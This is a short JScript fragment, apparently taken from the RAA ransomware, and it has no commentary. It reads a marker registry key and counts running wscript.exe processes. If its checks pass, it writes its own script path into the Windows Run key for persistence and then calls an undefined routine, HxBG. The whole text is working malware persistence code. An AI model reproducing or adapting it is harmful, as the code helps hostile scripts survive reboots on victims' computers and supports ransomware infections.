function addEntryToRegistryRun() {
    var check;
    var runner = WScript.CreateObject("WScript.Shell");
    try {
        runner.RegRead("HKCU\\RAA\\Raa-fnl\\");
    } catch (e) {
        check = 0;
    }
    var parts = [];
    var windowsScriptExec = "wscript.exe";
    var counter = 0;
    var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
    for (; !e.atEnd(); e.moveNext()) {
        var p = e.item();
        parts = parts + p.Name + ",";
    }
    parts = parts.split(",");
    var iterator = -1;
    do {
        iterator += 1;
        if (parts[iterator] == windowsScriptExec) {
            counter = counter + 1;
        } else {
            null
        }
    } while (iterator < parts.length);
    if (counter < 2 && check == 0) {
        var scriptFullName = WScript.ScriptFullName;
        scriptFullName = scriptFullName + " argument";
        var runner2 = WScript.CreateObject("WScript.Shell");
        runner2.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", scriptFullName, "REG_SZ");
        HxBG();
    } else {
        null;
    }
    return 0;
}
addEntryToRegistryRun();